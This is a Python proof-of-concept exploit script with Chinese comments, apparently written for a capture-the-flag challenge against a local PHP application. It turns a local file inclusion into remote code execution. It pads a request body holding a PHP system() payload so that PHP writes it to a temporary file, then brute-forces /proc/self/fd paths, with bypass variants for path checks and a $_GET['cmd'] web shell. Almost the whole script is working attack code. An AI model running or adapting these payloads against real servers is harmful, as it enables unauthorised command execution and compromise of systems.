
import requests
import sys
import time
import random
import string


TARGET_URL = "http://127.0.0.1:15941/index.php"  # 修改为目标 URL
CMD = "cat /flag"  # 要执行的命令

# 临时文件 fd 爆破范围（通常从 3 开始）
FD_START = 3
FD_END = 50

# 请求体大小阈值（必须 > 8KB = 8192 字节）
# 建议设置更大以确保触发磁盘临时文件，如 100KB
BODY_SIZE = 100 * 1024  # 100KB

# ========== 构造恶意请求体 ==========
def generate_malicious_body(cmd, size):
    """
    生成恶意请求体
    - 开头写入 PHP 代码
    - 剩余部分用随机数据填充到指定大小
    """
    # PHP 代码（可根据需要修改）
    # 使用 system() 或更通用的 shell_exec
    php_code = f"<?php system('{cmd}'); die(); ?>"
    
    # 确保 PHP 代码在开头，并可选择添加换行等混淆
    body = php_code
    
    # 填充剩余长度
    remaining = size - len(body)
    if remaining > 0:
        # 用随机字符填充（避免被压缩或过滤）
        filler = ''.join(random.choices(string.ascii_letters + string.digits, k=remaining))
        body += filler
    
    return body

# ========== 发送攻击请求 ==========
def send_exploit(fd, body):
    """
    发送攻击请求
    - POST 请求体包含恶意代码
    - GET 参数 f 指向 /proc/self/fd/a/../{fd}
    """
    # 构造路径（绕过正则 + realpath 检查）
    # /proc/self/fd/a/../3 → 规范化后 → /proc/self/fd/3
    path = f"/proc/self/fd//{fd}"
    
    # 也可以尝试其他变体：
    # path = f"/proc/self/fd/%2e%2e/%2e%2e/{fd}"  # URL 编码的 ..
    # path = f"/proc/self/fd//../{fd}"            # 双斜杠
    
    params = {'f': path}
    
    # 可选：添加 cmd 参数以便动态执行（如果 PHP 代码支持）
    # params['cmd'] = CMD
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (POC)',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    
    try:
        # 发送 POST 请求，Body 为恶意内容
        response = requests.get(
            TARGET_URL,
            params=params,
            data=body,
            headers=headers,
            timeout=10
        )
        return response
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {e}")
        return None

# ========== 检测 RCE 是否成功 ==========
def check_success(response):
    """
    检查响应中是否包含命令执行结果
    """
    if response is None:
        return False
    
    # 根据命令输出判断
    # 如果执行 id，响应中应该包含 "uid=" 或 "gid="
    if CMD == "id":
        indicators = ["uid=", "gid=", "groups="]
        for ind in indicators:
            if ind in response.text:
                return True
    else:
        # 通用检查：响应中不包含明显的 PHP 错误
        if "Warning" not in response.text and "Fatal error" not in response.text:
            # 并且响应非空
            if len(response.text) > 0 and "<?php" not in response.text[:100]:
                return True
    
    return False

# ========== 主函数 ==========
def main():
    print("[*] hdphp LFI to RCE POC")
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Command: {CMD}")
    print(f"[*] Body size: {BODY_SIZE} bytes ({BODY_SIZE/1024:.1f} KB)")
    print(f"[*] FD range: {FD_START} - {FD_END}")
    print()
    
    # 生成恶意请求体
    print("[*] Generating malicious request body...")
    body = generate_malicious_body(CMD, BODY_SIZE)
    print(f"[+] Body generated, size: {len(body)} bytes")
    
    # 爆破 fd
    for fd in range(FD_START, FD_END + 1):
        print(f"\n[*] Trying fd = {fd} ...")
        
        # 发送攻击请求
        response = send_exploit(fd, body)
        
        if response is None:
            continue
        
        # 检查响应状态码
        print(f"    HTTP Status: {response.status_code}")
        
        # 检查是否成功
        if check_success(response):
            print(f"\n[+] SUCCESS! fd = {fd}")
            print("[+] Command output:")
            print("-" * 50)
            # 提取并打印输出（去除可能的 PHP 错误/警告）
            output = response.text.strip()
            # 简单过滤，如果输出过长只显示前 2000 字符
            if len(output) > 2000:
                output = output[:2000] + "\n... (truncated)"
            print(output)
            print("-" * 50)
            return
        
        # 可选：显示响应前 200 字符用于调试
        # print(f"    Response preview: {response.text[:200]}")
        
        # 短暂延迟，避免过度请求
        time.sleep(0.5)
    
    print("\n[-] Exploit failed: No working fd found")
    print("[*] Suggestions:")
    print("    1. Check if target is using Nginx")
    print("    2. Try larger body size (e.g., 200KB or 500KB)")
    print("    3. Try different path bypass techniques")
    print("    4. Adjust FD range (maybe higher fd numbers)")

# ========== 变体1：使用 POST 参数传递命令 ==========
def exploit_with_dynamic_cmd():
    """
    变体：PHP 代码从 GET 参数读取命令，更灵活
    """
    php_code = "<?php system($_GET['cmd']); die(); ?>"
    body = php_code + 'A' * (BODY_SIZE - len(php_code))
    
    for fd in range(FD_START, FD_END + 1):
        path = f"/proc/self/fd/a/../{fd}"
        params = {'f': path, 'cmd': CMD}
        
        try:
            response = requests.post(TARGET_URL, params=params, data=body, timeout=10)
            if response.status_code == 200 and "uid=" in response.text:
                print(f"[+] Success! Output:\n{response.text[:500]}")
                return True
        except:
            pass
        
        time.sleep(0.5)
    
    return False

# ========== 变体2：使用换行绕过正则 ==========
def exploit_with_newline_bypass():
    """
    使用 %0a（换行）绕过正则的 . 匹配
    """
    # 正则中 . 不匹配换行，所以 /proc%0a/ 可以绕过 .{15,} 检查
    path = "/proc%0a/self/fd/a/../3"  # %0a 插入后，正则匹配不到 15 个连续非换行字符
    
    body = generate_malicious_body(CMD, BODY_SIZE)
    params = {'f': path}
    
    response = requests.post(TARGET_URL, params=params, data=body)
    
    if response and "uid=" in response.text:
        print("[+] Success with newline bypass!")
        print(response.text[:500])
        return True
    return False

if __name__ == "__main__":
    # 运行主攻击
    main()
    
    # 如需使用变体，取消注释以下行
    # print("\n[*] Trying dynamic cmd variant...")
    # exploit_with_dynamic_cmd()